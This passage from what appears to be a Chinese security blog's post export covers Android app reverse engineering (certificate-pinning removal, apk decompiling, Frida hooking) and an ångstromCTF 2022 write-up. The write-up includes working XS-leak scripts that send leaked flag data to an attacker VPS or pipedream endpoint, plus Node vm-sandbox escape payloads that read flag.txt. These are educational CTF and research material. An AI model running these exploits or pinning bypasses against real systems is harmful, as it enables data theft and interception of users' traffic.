interfaces，手機才連的到： 電腦的 proxy 就這樣設置完成了，接著我們來設定手機。 在開始設定以前，記得要先讓手機跟電腦連到同一個 wifi，才會在同樣的網路底下。再來，在電腦上看一下自己的內網 IP 是多少，前往手機裡的設定 &#x3D;&gt; 連線 &#x3D;&gt; Wi-Fi，接著編輯連到的網路，設置手動 proxy，讓手機的流量 proxy 到電腦去。 然後我們要在手機上安裝 Burp Suite 的憑證，手機上直接造訪 http://burpsuite 即可，會下載一個檔案叫做 cert.der，記得改名成 cert.cer 後點開就可以安裝憑證。 到這邊為止，手機上的準備就完成了。 改造 apk這次拿來示範的 apk 在這裡：https://github.com/aszx87410/demo/raw/master/android/demoapp-http.apk App 的內容很簡單，就是按下按鈕以後會發 request，只要有監聽到就代表成功了。裝上 app 之後可以先試試看，你應該會發現儘管上面那些都設定好了，proxy 還是一片空白。 原因就如同我開頭講的一樣，在 Android 官方文件裡有一個章節就在講這個：Network security configuration 而改造方法也很簡單，基本上不需要動到程式碼，因此我們先用 Apktool 把 apk 解開。 接著打開 AndroidManifest.xml，找到 &lt;application&gt; 的地方，看一下有沒有 android:networkSecurityConfig 這個屬性，沒有的話就加上去：android:networkSecurityConfig=&quot;@xml/network_security_config&quot;，有的話就記住 xml 的名稱。 再來我們去 res&#x2F;xml 底下，新增 network_security_config.xml，內容為： &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;network-security-config> &lt;base-config cleartextTrafficPermitted=\"true\"> &lt;trust-anchors> &lt;certificates src=\"system\" /> &lt;certificates src=\"user\" /> &lt;/trust-anchors> &lt;/base-config> &lt;/network-security-config> 這個檔案內容代表這個 app 信任所有憑證，包括使用者自行安裝的憑證也是。如果 app 裡面本來就有這個檔案，你可以把內容取代成上面的，確保 app 有信任使用者的憑證。 接著把 apk 打包裝回去，再按下按鈕看看，應該就能從 proxy 看到攔截到的流量： Certificate pinning如果上面的動作做完以後，proxy 還是監聽不到，那就代表 app 裡面可能有其他安全性的設置，例如說 certificate pinning。 什麼是 certificate pinning 呢？如果網頁有用 https，就代表伺服器有一個 https 的憑證，而 certificate pinning 就代表 app 裡有指定某個 domain 對應到的憑證應該要是什麼，如果憑證不符，就代表有人在中間搞事，所以拒絕連線。 以熱門的 library OkHttp 為例，文件上就有寫說應該怎麼實作這個功能： String hostname = \"publicobject.com\"; CertificatePinner certificatePinner = new CertificatePinner.Builder() .add(hostname, \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\") .build(); OkHttpClient client = OkHttpClient.Builder() .certificatePinner(certificatePinner) .build(); Request request = new Request.Builder() .url(\"https://\" + hostname) .build(); client.newCall(request).execute(); 如果想實作看看的話，可以拿這個 apk 檔來嘗試：https://github.com/aszx87410/demo/raw/master/android/demoapp-pinning.apk 我們一樣用 apktool 解開，接著先照之前那樣，把 network security config 給放進去，再來就是要找到程式碼哪裡有用到 certificate pinner 了。 因為這次的程式碼有開啟 proguard，所以連 okhttp 也被混淆了，直接用 certificatePinner 做關鍵字下去搜尋不一定找得到東西。那怎麼辦呢？我們可以換個方式，在使用這個功能的時候，一定要寫一組 sha256 的值在裡面，所以我們可以搜尋：sha256/ 可以找到這樣一個段落： # virtual methods .method public run()V .locals 13 .line 1 new-instance v0, Ljava/util/ArrayList; invoke-direct &#123;v0&#125;, Ljava/util/ArrayList;->&lt;init>()V const-string v1, \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\" .line 2 filled-new-array &#123;v1&#125;, [Ljava/lang/String; move-result-object v1 const-string v2, \"archive.org\" const-string v3, \"pattern\" .line 3 invoke-static &#123;v2, v3&#125;, Lc/j/b/d;->d(Ljava/lang/Object;Ljava/lang/String;)V const-string v3, \"pins\" invoke-static &#123;v1, v3&#125;, Lc/j/b/d;->d(Ljava/lang/Object;Ljava/lang/String;)V const/4 v3, 0x0 const/4 v4, 0x0 找到之後該做什麼呢？難道要去改 smali，把 certificate pinner 拿掉嗎？其實有更簡單的做法。 從程式碼中可以猜得出來底下那個 archive.org 應該就是綁定的網域，因此只要把這個網域隨便改成其他字串即可，如此一來其他的網域就不會檢查憑證是否相符。 改完以後重新打包 app 並安裝，就能正常監聽到流量。 像上面這樣是去改變使用 certificatePinner 的地方，還有另一個方式是直接去改變 okhttp 的實作，找到 smali 中的 okhttp3/CertificatePinner$Builder.smali，有一個 function 是： # virtual methods .method public varargs add(Ljava/lang/String;[Ljava/lang/String;)Lokhttp3/CertificatePinner$Builder; .locals 5 這個就是 okhttp 在處理新增 certificate pinner 時的方法，我們只要這樣改就好了： # virtual methods .method public varargs add(Ljava/lang/String;[Ljava/lang/String;)Lokhttp3/CertificatePinner$Builder; .locals 5 # patch const-string p1, \"abc\" 這樣第一個參數（domain）就永遠是 abc，永遠不會生效。 總結這篇文章中我們學習到了如何自己動手改造 app，拿掉一些防中間人攻擊的機制，例如說改掉 network security config 以及程式碼中處理 certificate pinning 的部分。 對於一般的 app 來說，做到這邊應該就滿夠的了，至少能夠監聽流量，看見 app 到底發送了些什麼。而且跟 VPN 的解法相比，還有另外一個好處，那就是可以二次打包，包出一個把 API 網址換掉也能動的版本，自由度比較高。 在下一篇裡面，我們會學習另外一種分析 app 的方式。 系列文連結： Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Android App 逆向入門之三：監聽 app 封包 - 你在這篇 Android App 逆向入門之四：使用 Frida 進行動態分析","link":"/2023/04/27/android-apk-decompile-intro-3/"},{"title":"[Android] 人人都會的 apk 反編譯","text":"前言對於 Android 工程師來說，了解如何反編譯可以增進自己對 Android 底層的理解，也可以思考如何保護自己的 apk 不被反編譯。對於一般人來說，許多現成的工具可以幫助我們非常輕鬆的、只要打打幾個指令就可以反編譯 apk，看到 java source code，滿足自己的好奇心。本篇文章只介紹一些工具的使用，適合初學者觀看。若是想了解更底層的知識，可以參考文末附上的延伸閱讀。 事前準備首先，我們需要一個用來被破解的 apk，簡單用任何你平常熟悉的工具自己 build 一個就好了架構很簡單，只要一個 MainActivity 跟兩個TextView就好 MainActivity.javapublic class MainActivity extends Activity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); TextView text = (TextView)findViewById(R.id.text); text.setText(\"Taiwan No1\"); &#125; &#125; activity_main.xml&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:orientation=\"vertical\" android:layout_height=\"match_parent\"> &lt;TextView android:text=\"@string/hello_world\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" /> &lt;TextView android:id=\"@+id/text\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" /> &lt;/LinearLayout> 安裝到手機上之後，會看到這樣的畫面： 實際動手好，這個就是我們要拿來測試的 apk 了接著你需要一些非常好用的工具 apktool jd-gui dex2jar 如何安裝就不再贅述了，大家看看文件或是上網搜尋一下就會有一堆解答apktool是拿來把 apk 拆開用的，可以反編譯 apk 之後，看到 smali 檔案跟 resourcedex2jar可以把 apk 轉成 jar，再用jd-gui檢視 java code 接著我們開啟 terminal，到剛剛那個示範 apk 的目錄底下，執行apktool d APKNAME.apk 執行以後，會自動生成一個APKNAME的資料夾，裡面就是反編譯出來的東西了 . ├── AndroidManifest.xml ├── apktool.yml ├── original ├── res └── smali 其中比較值得講的是smali這個資料夾，其實這裡面就是你的 source code，只是格式不太一樣你可以在smali這資料夾裡面找到你的MainActivity.java，內容如下：（覺得長得很奇怪是很正常的事，但是認真多看幾眼，你會發現其實沒那麼難懂） MainActivity.java.class public Lapktest/huli/com/apkdecompile/MainActivity; .super Landroid/app/Activity; .source \"MainActivity.java\" # direct methods .method public constructor &lt;init>()V .locals 0 .prologue .line 8 invoke-direct &#123;p0&#125;, Landroid/app/Activity;->&lt;init>()V return-void .end method # virtual methods .method protected onCreate(Landroid/os/Bundle;)V .locals 2 .param p1, \"savedInstanceState\" # Landroid/os/Bundle; .prologue .line 12 invoke-super &#123;p0, p1&#125;, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V .line 13 const v1, 0x7f040019 invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;->setContentView(I)V .line 14 const v1, 0x7f0c0050 invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;->findViewById(I)Landroid/view/View; move-result-object v0 check-cast v0, Landroid/widget/TextView; .line 15 .local v0, \"text\":Landroid/widget/TextView; const-string v1, \"Taiwan No1\" invoke-virtual &#123;v0, v1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V .line 16 return-void .end method 你可以仔細對照一下剛剛自己寫的 java code，會發現只是換了種格式而已 setContentView(R.layout.activity_main); 其實就等於 .line 13 const v1, 0x7f040019 invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;->setContentView(I)V 你可能會好奇，這個0x7f040019是哪來的？事實上，你可以在res/values/public.xml這個檔案裡面找到答案： &lt;public type=\"layout\" name=\"activity_main\" id=\"0x7f040019\" /> 到這裡，應該就可以大概猜出 Android 在編譯時候的流程 把所有資源檔壓縮、處理並且包在一起，產生id與記憶體位置對照表 把程式碼裡面所有的R.xx.xxx透過剛剛產生的表，換成實際的記憶體位置 把 java code 變成 smali code（有點像把 C 變成組合語言的程式碼那樣） 修改在剛剛的smali裡面，有這麼一段： .line 15 .local v0, \"text\":Landroid/widget/TextView; const-string v1, \"Taiwan No1\" invoke-virtual &#123;v0, v1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V 讓我們把Taiwan No1換成T@iw@n n0!還記得另一個TextView有用到R.string.hello_world嗎？在res/values/strings.xml裡面，可以找到這一串的定義： &lt;string name=\"hello_world\">Hello world!&lt;/string> 改成 &lt;string name=\"hello_world\">HELLO WORLD&lt;/string> 確定都有改完以後，就可以把這些程式碼再度「組裝」回去還記得剛剛反編譯的指令嗎？apktool d APK_NAME.apk這邊的d就是decompile的意思，所以如果要逆向組裝回去，就是b，build apktool b APK_NAME 執行完之後可以在APK_NAME/dist下面找到一個 apk要注意的是這個 apk 還沒有被 sign 過，因此無法安裝可以隨便生成一個 keystore 或是找現成的來簽署jarsigner -verbose -digestalg SHA1 -keystore ~/KEY.keystore APK_NAME.apk KEY_ALIAS 安裝完以後就會看到這樣的畫面： 沒錯！就是這麼簡單，一個 apk 就這樣被修改了 可是smali的程式碼不好懂，能不能直接看到 java code呢？這時候剛剛推薦的工具dex2jar與jd-gui就派上用場了前者可以把 apk 變成 jar，後者可以開啟一個 jar 並且顯示 java code兩個組合在一起，就可以直接看到原本的程式碼了 dex2jar下載下來之後會有一堆的 shell script，dex2jar就是我們想要的那個./d2j-dex2jar.sh app.apk執行完之後會有一個 jar，用 jd-gui 打開，會看到你的程式碼一覽無遺 總結沒接觸過反編譯的人可能會很驚訝：什麼！要改掉一個 apk 居然這麼簡單！沒錯，就是這麼簡單，而且這只是一個很基本的範例事實上，你想要加入新的程式碼、加入新的資源（圖片、聲音等等）也是可以的也就是說，你不只可以修改，還可以擴充原本的 apk 但也有些方法可以防止不肖人士反編譯 apk例如說加殼、混淆、動態載入等等這邊的話以後有機會再介紹 延伸閱讀 Android 反編譯與防止被反編譯 [Android] 程式碼混淆(ProGuard)與反組譯 [Android] 反組譯 破解Android的apk安裝檔 反编译的常用工具与使用方法 Smali–Dalvik虚拟机指令语言–&gt;【android_smali语法学习一】 android反编译-smali语法","link":"/2016/03/20/android-apk-decompile/"},{"title":"ångstromCTF 2022 筆記","text":"這次的比賽我第一天有事沒辦法參加，第二天參與時發現 web 的題目被隊友解的差不多了，所以有滿多題目沒去看的。 因為我滿愛 JavaScript 跟 XS-leak，所以這篇只會記兩題我最有興趣的： web&#x2F;Sustenance misc&#x2F;CaaSio PSE （之後有機會再補另一題 DOMPurify + marked bypass 的 XSS） web&#x2F;Sustenance這是一個功能非常簡單的 App： const express = require(\"express\"); const cookieParser = require(\"cookie-parser\"); const path = require(\"path\"); const app = express(); app.use(express.urlencoded(&#123; extended: false &#125;)); // environment config const port = Number(process.env.PORT) || 8080; const adminSecret = process.env.ADMIN_SECRET || \"secretpw\"; const flag = process.env.FLAG || \"actf&#123;someone_is_going_to_submit_this_out_of_desperation&#125;\"; function queryMiddleware(req, res, next) &#123; res.locals.search = req.cookies.search || \"the quick brown fox jumps over the lazy dog\"; // admin is a cool kid if (req.cookies.admin === adminSecret) &#123; res.locals.search = flag; &#125; next(); &#125; app.use(cookieParser()); app.get(\"/\", (req, res) => &#123; res.sendFile(path.join(__dirname, \"index.html\")); &#125;); app.post(\"/s\", (req, res) => &#123; if (req.body.search) &#123; for (const [name, val] of Object.entries(req.body)) &#123; res.cookie(name, val, &#123; httpOnly: true &#125;); &#125; &#125; res.redirect(\"/\"); &#125;); app.get(\"/q\", queryMiddleware, (req, res) => &#123; const query = req.query.q || \"h\"; // h let status; if (res.locals.search.includes(query)) &#123; status = \"succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance\"; &#125; else &#123; status = \"failed\"; &#125; res.redirect( \"/?m=\" + encodeURIComponent( `your search that took place at $&#123;Date.now()&#125; has $&#123;status&#125;` ) ); &#125;); app.listen(port, () => &#123; console.log(`Server listening on port $&#123;port&#125;`); &#125;); 你可以設置任意 cookie，也可以搜尋某些字元是否存在於 flag 當中，而這題沒有 XSS 的點又有搜尋功能，因此顯然是 XS-leak。 既然是 XS-leak，就要觀察「有搜尋到」跟「沒搜尋到」的差別是什麼，搜尋的 query 長這樣：/q?q=actf，如果有搜尋到的話，會導到 /?m=your search...at 1651732982748 has success....，沒搜尋到的話會導到 /?m=your search...ar 1651732982748 has failed 而 index.html 只會把網址列上 m 的內容 render 到畫面上，因此成功跟失敗的差異有兩個： 網址不同 頁面的內容不同 一開始我嘗試的方向是 cache probing，因為有造訪過的頁面會存進 disk cache，所以只要用 fetch + force-cache 的方式，就可以根據時間差來判斷是否在 cache 內。至於網址列上的 timestamp，直接設個爆搜的範圍就好，例如說 1~1000 之類的。 因為預設 SameSite&#x3D;Lax 的關係，所以搜尋的時候只能用 window.open 這種 top-level navigation，否則 cookie 帶不出去。 而最大的問題是 Chrome 現在有 cache partitioning，新開的頁面的 cache key 是：(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)，但假設我自己開個 ngrok 裡面用 fetch，cache key 會是：(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)，cache key 是不同的，所以抓不到 cache。 我跟隊友也有討論過既然可以設定 cookie，那是不是可以利用 cookie bomb 來做事，但討論過後我們也沒找出什麼方法。 接著我嘗試利用 pbctf 2021 Vault 中的方法，用 a:visited 去洩露 history，改了一下上面這篇的 POC 以後可以動，但丟去 admin bot 發現無效。自己在本機測了一下，發現應該是因為 headless 的關係，不管怎樣 render 的時間都是 16ms。 試到沒什麼招了以後，lebr0nli 貼了一個利用 cache probing 的 POC，是從 maple 的 writeup 中看來的，而重點是「這個 POC 可以利用別的題目，藉此跑在 same site 上面」，例如說另一題的網址是 https://xtra-salty-sardines.web.actf.co/，從這邊用 fetch 的話，cache key 也會是 (https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)，因為 cache key 只看 eTLD+1，所以 same site 的網站，cache key 也會一樣。 但他碰到的問題是 local 可以跑，可是在 remote 上面怎麼樣都是 false positive。於是我照著他的 POC 改了一下，試著多回傳一些數字，發現問題出在 server 跑得異常的快。舉例來說，有 cache 的要 3ms，沒有 cache 的也只要 5ms，相差極少，連 timestamp 的部分也是，大概是 window.open 之後 10ms 以內。 因此我修改了一下程式碼，直接在遠端計算有 cache 的平均時間，就順利 leak 出了 flag，程式碼如下： https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722 // to hang the connection fetch('https://deelay.me/20000/https://example.com') // NOTE: we will calculate this baseline before doing the attack var baseLine = 3.2 const sleep = ms => new Promise((resolve) => setTimeout(resolve, ms)) go() async function go() &#123; await calculateBaseline() main() async function calculateBaseline() &#123; var m = Math.random() let win = window.open('https://sustenance.web.actf.co/?m=cached_' + m) // NOTE: this number can be decreased by detecting window load await sleep(500) win.close() let total = 0 for(let i=1; i&lt;=5; i++) &#123; let ts = await getLoadTime('https://sustenance.web.actf.co/?m=cached_' + m) total += ts report(`Cached time, round: $&#123;i&#125;, $&#123;ts&#125;ms`) &#125; // NOTE: 0.5 is just a random guess baseLine = (total/5) + 0.5 report(`Baseline: $&#123;baseLine&#125;`) // NOTE: adjust baseline, should not be more than 3 ms based on previous testing if (baseLine > 3) &#123; baseLine = 3 &#125; for(let i=1; i&lt;=3; i++) &#123; let ts = await getLoadTime('https://sustenance.web.actf.co/?m=not_cached_' + m) report(`Not Cached time, round: $&#123;i&#125;, $&#123;ts&#125;ms`) &#125; &#125; // NOTE: server is quite fast so no need to set timeout async function getLoadTime(url) &#123; const start = performance.now() await fetch(url, &#123; cache: 'force-cache', mode: 'no-cors' &#125;) return performance.now() - start &#125; function genSucceedUrl(t) &#123; let ft = t + '' while(ft.length &lt; 13) &#123; ft += '0' &#125; const status = \"succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance\"; return 'https://sustenance.web.actf.co/?m=' + encodeURIComponent(`your search that took place at $&#123;ft&#125; has $&#123;status&#125;`); &#125; async function isCached(str) &#123; let start = +new Date() let win = window.open(`https://sustenance.web.actf.co/q?q=` + encodeURIComponent(str)) await sleep(500) win.close() // NOTE: base on the data collected, i should be 1~20, pretty small number for(let i=1; i&lt;=30; i++) &#123; const url = genSucceedUrl(start + i) let loadTime = await getLoadTime(url) if (loadTime &lt;= baseLine) &#123; // NOTE: check again to see if it really meets the condition let total = 0 for(let j=1; j&lt;=3; j++) &#123; total += await getLoadTime(url) &#125; total/=3 if (total &lt;= baseLine) &#123; report(`isCached success, str=$&#123;str&#125;, i=$&#123;i&#125;, start=$&#123;start&#125;, total=$&#123;total&#125;`) return true &#125; &#125; &#125; return false &#125; async function main() &#123; let flag = 'actf&#123;yummy_' // NOTE: we can leak the charset first to speed up the process let chars = 'acefsmntuy_&#125;'.split('') while(flag[flag.length - 1] !== '&#125;') &#123; for(let char of chars) &#123; report('trying:' + flag + char) if (await isCached(flag + char)) &#123; flag += char report('flag:' + flag) break &#125; &#125; &#125; &#125; async function report(data) &#123; console.log(data) // TODO: change to your VPS return fetch('https://YOUR_VPS/', &#123; method: 'POST', body: data, mode: 'no-cors' &#125;).catch(err => err); &#125; &#125; 我們可以先 leak 出 charset，速度就會快很多。上面還有些小地方可以再調整的，整體速度應該會再更快。 後來隊友也有貼了另外一篇 writeup：UIUCTF 2021- yana，從中得知 headless chrome 目前是沒有 cache partitioning 的。 我自己實際測了一下，發現到現在還是這樣，所以這題其實不需要借用其他題目，自己架個 ngrok 就可以搞定。 預期解預期解應該就是我上面說過的 cookie bomb，先設置一大堆 cookie，然後利用成功跟失敗的 url 網址不同這個特性，如果成功的話 url 會比較長，request 就會太大，server 就會回錯誤，失敗的話就不會有事。 底下的 script 來自 Strellic，一樣要借用其他題目來跑在 same site 上面： &lt;>'\";&lt;form action='https://sustenance.web.actf.co/s' method=POST>&lt;input id=f />&lt;input name=search value=a />&lt;/form> &lt;script> const $ = document.querySelector.bind(document); const sleep = (ms) => new Promise(r => setTimeout(r, ms)); let i = 0; const stuff = async (len=3500) => &#123; let name = Math.random(); $(\"form\").target = name; let w = window.open('', name); $(\"#f\").value = \"_\".repeat(len); $(\"#f\").name = i++; $(\"form\").submit(); await sleep(100); &#125;; const isError = async (url) => &#123; return new Promise(r => &#123; let script = document.createElement('script'); script.src = url; script.onload = () => r(false); script.onerror = () => r(true); document.head.appendChild(script); &#125;); &#125; const search = (query) => &#123; return isError(\"https://sustenance.web.actf.co/q?q=\" + encodeURIComponent(query)); &#125;; const alphabet = \"etoanihsrdluc_01234567890gwyfmpbkvjxqz&#123;&#125;ETOANIHSRDLUCGWYFMPBKVJXQZ\"; const url = \"//en4u1nbmyeahu.x.pipedream.net/\"; let known = \"actf&#123;\"; window.onload = async () => &#123; navigator.sendBeacon(url + \"?load\"); await Promise.all([stuff(), stuff(), stuff(), stuff()]); await stuff(1600); navigator.sendBeacon(url + \"?go\"); while (true) &#123; for (let c of alphabet) &#123; let query = known + c; if (await search(query)) &#123; navigator.sendBeacon(url, query); known += c; break; &#125; &#125; &#125; &#125;; &lt;/script> 這邊有幾個細節要知道： request 太大的話 server 會回錯誤 因為是 same site，所以 &lt;script&gt; 發 request 時會自動帶 cookie 利用 script 的 event 來偵測 http status code 是不是成功 當初卡關是因為： 沒想到可以利用其他題目來繞過 same site cookie 沒注意到 request URL 也包含在長度裡面，只想到 header&#x2F;body misc&#x2F;CaaSio PSE這題是限制很嚴格的 js jail，題目長這樣： #!/usr/local/bin/node // flag in ./flag.txt const vm = require(\"vm\"); const readline = require(\"readline\"); const interface = readline.createInterface(&#123; input: process.stdin, output: process.stdout, &#125;); interface.question( \"Welcome to CaaSio: Please Stop Edition! Enter your calculation:\\n\", function (input) &#123; interface.close(); if ( input.length &lt; 215 &amp;&amp; /^[\\x20-\\x7e]+$/.test(input) &amp;&amp; !/[.\\[\\]&#123;&#125;\\s;`'\"\\\\_&lt;>?:]/.test(input) &amp;&amp; !input.toLowerCase().includes(\"import\") ) &#123; try &#123; const val = vm.runInNewContext(input, &#123;&#125;); console.log(\"Result:\"); console.log(val); console.log( \"See, isn't the calculator so much nicer when you're not trying to hack it?\" ); &#125; catch (e) &#123; console.log(\"your tried\"); &#125; &#125; else &#123; console.log( \"Third time really is the charm! I've finally created an unhackable system!\" ); &#125; &#125; ); VM bypass 的部分很簡單，可以用 this.constructor.constructor(&#39;return ...&#39;)() 來搞定，但是難點在於限制的字元很多，字串相關的都不給用，. 跟 [] 也不行，&#123;&#125;;&gt; 也不行，卡了很多東西。嘗試一陣子之後想起用 with 也可以來存取屬性，像這樣： with(console)log(123) 字串的部分可以用 regexp 來繞，像這樣：/string/.source。 做一做有想到是不是可以用 decodeURI 來繞一些字元，不過沒有仔細想，賽後發現很多人用這招來解，像是 lebr0nli 的： eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))() regexp 如果直接變成字串，前後會有兩個 /，只要在 regexp 裡面加上 /\\n，就會跟前面的結合變成這樣： // your_code_here 概念跟我之前出的 XSS challenge 其實滿類似的。 總之，我最後組出的 payload 框架長這樣： with(/console.log(1)/)with(this)with(constructor)constructor(source)() 只要把 console.log(1) 改成想跑的程式碼就行了，而我們想執行的程式碼是： return String(process.mainModule.require('fs').readFileSync('flag.txt')) 轉成字串那個步驟不一定需要，只是讓 flag 可讀性更好而已。 接著可以利用 with 把上面的程式碼轉成： with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt'))) 由於不能有單引號，所以我們可以先把那些變成變數比較好讀，之後再來看怎麼拿掉： with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n))) 現在只需要產生出字串就好，可以用 String.fromCharCode 達到這件事： with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process) with(mainModule)with(require(k))return(String(readFileSync(n))) // 這邊跟上面都一樣 因此最後的 payload 就是把這段程式碼跟剛剛的框架拼在一起，我稍微排版一下比較好讀： with( /with(String) with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process) with(mainModule) with(require(k)) return(String(readFileSync(n))) /) with(this) with(constructor) constructor(source)() 看了 Maple 的 payload 才發現 with 巢狀會被蓋掉的方法可以用 with(a=source,/b/) 繞掉，舉例來說： with(/a/)with(/b/)console.log(source) 你只能拿到 /b/.source，拿不到 a 的，因為屬性同樣名稱。所以你可以這樣寫： with(/a/)with(a=source,/b/)console.log(a,source) 直接在第二個 with 裡面先用 a=source 去拿到上一個 with 的屬性。 除了 with 以外，還利用了 require(&#39;repl&#39;).start() 這個神奇的內建模組，簡單來說就是開啟 repl 模式，之後你想執行什麼就執行甚麼，可以擺脫字元的限制。底下是他的 payload： with(/with(process)with(mainModule)with(require(x))start()/) with(s1=source,/x/) with(s2=source,/repl/) with(s3=source,this) with(constructor) constructor(s2,s1)(s3) 作者的解法是這樣，沒有用到 regexp： with(String) with(f=fromCharCode,this) with(constructor) with(constructor(f(r=114,101,t=116,117,r,110,32,112,r,111,99,101,s=115,s))()) with(mainModule) with(require(f(102,s))) readFileSync(f(102,108,97,103,46,t,120,t)) 這個解法利用了一堆暫存變數來節省字元，這招也很聰明，結合了 Maple 的解法的話就變成： with(String) with(f=fromCharCode,this) with(constructor) with(constructor(f(r=114,e=101,t=116,117,r,110,32,p=112,r,111,99,e,s=115,s))()) with(mainModule) with(require(f(r,e,p,108))) start() 然後雖然大家很愛用 this.constructor.constructor，但理解原理就會知道第一個 constructor 只是為了拿到 function，可以找一下 object 上有哪些東西： for(let key of Object.getOwnPropertyNames((obj=&#123;&#125;).__proto__)) &#123; if (typeof obj[key] === 'function') &#123; console.log(key) &#125; &#125; 最短的是 valueOf，所以可以再縮成這樣： with(String)with(f=fromCharCode,this)with(valueOf)with(constructor(f(r=114,e=101,116,117,r,110,32,p=112,r,111,99,e,s=115,s))())with(mainModule)with(require(f(r,e,p,108)))start() 總共 177 個字元。 如果結合 Discord 中 fredd 的解法，有用到 regexp 的我找到最短的是這樣，115 個字： eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))","link":"/2022/05/05/angstrom-ctf-2022-writeup/"},{"title":"Android App 逆向入門之四：使用 Frida 進行動態分析","text":"前面幾篇我們講的都是靜態分析的東西，也就是說我們並沒有把 app 跑起來，只是透過反編譯出來的程式碼研究 app 運作的邏輯，並且修改程式碼後重新打包執行。 而動態分析指的就是我們會把 app 跑起來，並透過一些方式讓我們可以 hook 各種方法，去監視某些 method 的輸入以及輸出，甚至是竄改。 這篇就讓我們來學習該怎麼樣使用 Frida 進行動態分析。 系列文連結： Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Android App 逆向入門之三：監聽 app 封包 Android App 逆向入門之四：使用 Frida 進行動態分析 工具介紹：Frida這次要來使用的動態分析工具為 Frida，官網的介紹為：「Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.」，其實不只是 Android，其他平台也都可以使用 Frida 來做動態分析。 有一套叫做 Objection 的工具是以 Frida 為基礎開發的，建議可以直接裝這個，因為會順便連 Frida 一起裝好，安裝教學可參考：https://github.com/sensepost/objection/wiki/Installation 要用 Frida 的話，除了手機上要安裝以外，電腦也要安裝，至於如何安裝可直接參考官方網站的指示：https://frida.re/docs/installation/ 另外提醒一下，如果是手機裡面已經有了但是換一台電腦，要記得安裝的版本要一致，步驟是： 先去手機裡面看 frida 版本：frida-server --version，假設是 15.1.14 好了 到這邊找 frida-tools 的版本號 https://github.com/frida/frida/releases/tag/15.1.14 在電腦上安裝這兩個： pip install frida&#x3D;&#x3D;15.1.14 pip install frida-tools&#x3D;&#x3D;10.4.1 主要是版本號要對，不然會出現一堆錯誤。 另外，雖然說 Frida 這種東西感覺就是要 root 才能使用，但其實它有兩種方法可以跑，一種確實需要 root，另外一種不需要 root 需要 root 的要在手機上安裝 frida-server，詳情可參考官網：https://frida.re/docs/android/ 基本上就是丟個執行檔進去手機，然後用 root 的權限跑起來，檔案推進去要跑起來的時候如果不是預設 root，可以用 adb shell 進去改： adb shell # 先刪掉舊的 ps -e | grep frida-server kill -9 &#123;your_process_id&#125; # 確認用 root 跑 su /data/local/tmp/frida-server &amp; 跑起來之後可以用 frida-ps -U 確認是否有跑起來 第二種不需要 root 的方法要改 apk，原理是在 apk 裡面加一個 Frida 的 so 檔，並在入口點加一行 System.loadLibrary()，就可以使用 Frida，在 wiki 裡面有詳細說明：https://github.com/sensepost/objection/wiki/Patching-Android-Applications 上面改 apk 的流程不需要自己執行，有現成的指令幫你做，如果打包不起來可以用這個指令： objection patchapk --source test.apk --skip-resources --ignore-nativelibs 如果還是不行，可以運用我們之前學到的知識自己動手改造，先用 apktool d 把包好的 apk 拆開，然後自己改裡面東西，例如說有時候會有 so 檔案 align 的問題，就可以把 AndroidManifest.xml 裡的 android:extractNativeLibs 改成 true，再包回去就好了。 Frida 基本使用先講一下 Frida 是做什麼的，最普遍的用途是寫一些程式碼來 hook function，hook 指的就是你可以自己覆蓋任何一個 function 的實作，就可以觀察輸入以及輸出，也可以改變函式的回傳值。 而這些程式碼會用 JavaScript 來寫，並在啟動 app 時注入進去，以我自己的經驗來說，其實只要看多一點範例之後，就能滿快上手的。 講這麼多，不如動手來做做看，這次用的範例 app 跟第一篇一樣，就是個按下按鈕以後會檢測是否有 root 的 app：https://github.com/aszx87410/demo/raw/master/android/demoapp.apk 這個 app 開啟之後預設的 activity 會是 com.cymetrics.demo/MainActivity，我們先來 hook 這個 class 的 onCreate 方法看看。 我們先新建一個檔案 script.js，內容為： function run() &#123; Java.perform(() => &#123; var MainActivity = Java.use('com.cymetrics.demo.MainActivity') MainActivity.onCreate.implementation = function() &#123; console.log('MainActivity onCreate') &#125; &#125;) &#125; setImmediate(run) 接著下指令： frida -U --no-pause -l script.js -f \"com.cymetrics.demo\" 如果你沒有 root 的話，啟動方式會不太一樣，先照上面說的 patch app，接著在手機上安裝，然後在 terminal 輸入： frida -U Gadget -l script.js 接著你應該會看到你的 terminal 上面多了一行 log，內容就是 MainActivity onCreate，而手機上出現 app crash 的訊息，這是正常的。 先來簡單講一下 Frida 腳本的基本結構，起手式就是： function run() &#123; Java.perform(() => &#123; // 程式碼放這邊 